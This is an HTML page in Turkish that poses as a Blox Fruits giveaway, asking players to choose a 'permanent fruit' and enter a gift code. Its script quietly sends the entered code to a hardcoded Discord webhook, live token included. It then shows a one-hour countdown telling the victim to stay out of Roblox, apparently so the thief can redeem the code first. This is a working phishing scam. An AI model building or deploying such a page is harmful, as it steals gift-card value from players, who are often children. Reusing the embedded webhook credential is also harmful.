<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blox Fruits Form</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(to bottom right, #1e1e2f, #3e3e5e);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }

        h1 {
            font-size: 2rem;
            margin-bottom: 20px;
            text-align: center;
        }

        form {
            background-color: rgba(0,0,0,0.6);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            width: 350px;
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
        }

        select, input, button {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 8px;
            border: none;
            font-size: 1rem;
        }

        select, input {
            background-color: #fff;
            color: #000;
        }

        button {
            background-color: #ff4d4d;
            color: #fff;
            cursor: pointer;
            font-weight: bold;
            transition: 0.3s;
        }

        button:hover {
            background-color: #ff1a1a;
        }

        #timer {
            margin-top: 20px;
            font-size: 1.2rem;
            color: yellow;
            text-align: center;
        }
    </style>
</head>
<body>

    <h1>İstediğiniz Perm Meyveyi Seçin ve Gift Kodunu Girin</h1>

    <form id="fruitForm">
        <label for="fruit">Meyve Seçimi:</label>
        <select id="fruit" name="fruit">
            <option value="Rocket">Rocket</option>
            <option value="Spin">Spin</option>
            <option value="Blade">Blade</option>
            <option value="Spring">Spring</option>
            <option value="Bomb">Bomb</option>
            <option value="Smoke">Smoke</option>
            <option value="Spike">Spike</option>
            <option value="Flame">Flame</option>
            <option value="Ice">Ice</option>
            <option value="Sand">Sand</option>
            <option value="Dark">Dark</option>
            <option value="Diamond">Diamond</option>
            <option value="Light">Light</option>
            <option value="Rubber">Rubber</option>
            <option value="Ghost">Ghost</option>
            <option value="Magma">Magma</option>
            <option value="Quake">Quake</option>
            <option value="Buddha">Buddha</option>
            <option value="Love">Love</option>
            <option value="Spider">Spider</option>
            <option value="Sound">Sound</option>
            <option value="Phoenix">Phoenix</option>
            <option value="Portal">Portal</option>
            <option value="Rumble">Rumble</option>
            <option value="Pain">Pain</option>
            <option value="Blizzard">Blizzard</option>
            <option value="Gravity">Gravity</option>
            <option value="Mammoth">Mammoth</option>
            <option value="T-Rex">T-Rex</option>
            <option value="Dough">Dough</option>
            <option value="Shadow">Shadow</option>
            <option value="Venom">Venom</option>
            <option value="Control">Control</option>
            <option value="Spirit">Spirit</option>
            <option value="Dragon">Dragon</option>
            <option value="Leopard">Leopard</option>
            <option value="Kitsune">Kitsune</option>
        </select>

        <label for="gift">Gift Kodunu Giriniz:</label>
        <input type="text" id="gift" name="gift" placeholder="Gift kodunu yazınız..." required>

        <button type="submit">Gönder</button>
    </form>

    <div id="timer"></div>

    <script>
        const form = document.getElementById('fruitForm');
        const timerDiv = document.getElementById('timer');

        form.addEventListener('submit', function(e){
            e.preventDefault();

            const selectedFruit = document.getElementById('fruit').value;
            const giftCode = document.getElementById('gift').value;
            const webhookURL = "https://discord.com/api/webhooks/1438527190307311738/zZtQ36Bwhe4DyVGBpHOvaIHtP0XTVvxblwG2fSHBtrdEsrR7t0iVo3I2uvcvwu5U7sEa"; // Discord Webhook URL'i buraya ekle

            const message = `Seçilen Meyve: ${selectedFruit}\nGift Kodu: ${giftCode}`;

            // Discord'a gönder
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            });

            form.reset();

            // Sayaç başlat (1 saat)
            let timeLeft = 60 * 60; // saniye
            timerDiv.textContent = `Lütfen 1 saat boyunca Roblox'a girmeyin! Kalan süre: 60:00`;

            const countdown = setInterval(() => {
                timeLeft--;
                const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
                const seconds = (timeLeft % 60).toString().padStart(2, '0');
                timerDiv.textContent = `Lütfen 1 saat boyunca Roblox'a girmeyin! Kalan süre: ${minutes}:${seconds}`;

                if(timeLeft <= 0){
                    clearInterval(countdown);
                    timerDiv.textContent = "Artık Roblox'a girebilirsiniz!";
                }
            }, 1000);
        });
    </script>

</body>
</html>
